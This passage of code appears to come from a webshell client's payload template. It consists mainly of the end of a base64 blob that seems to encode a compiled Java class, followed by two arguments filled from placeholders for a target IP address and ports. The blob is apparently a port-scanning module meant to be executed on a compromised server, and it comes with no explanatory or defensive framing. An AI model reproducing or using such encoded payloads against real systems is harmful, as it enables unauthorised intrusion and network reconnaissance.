ACgAhAAtAIUAVACGAHIAhwBzAIgAdAAAAAgAAfcAcgcAdQABAIcAiAABAHAAAADzAAYABgAAAI8BTRJZuABaTi0SW7YAXJsANRJduAAFOgQZBBJeBL0AB1kDEwA5U7YAXxkEtgBgBL0ACVkDK1O2AArAAFHAAFFNpwBHEmG4AAU6BBkEEmIDvQAHtgBfAQO9AAm2AAo6BRkFtgAPEmMEvQAHWQMTADlTtgBfGQUEvQAJWQMrU7YACsAAUcAAUU0ssDoEA7wIsAABAAgAiACJAA4AAgBxAAAAMgAMAAAAjAACAI0ACACPABEAkAAYAJEAQACSAEMAkwBKAJQAXwCVAIcAlwCJAJgAiwCZAHQAAAASAAP9AEMHAFEHAHr7AENBBwB1AAEAiQAAAAIAig==',
        [arg1]: '#{newbase64::ip}',
        [arg2]: '#{newbase64::ports}'
    },
})
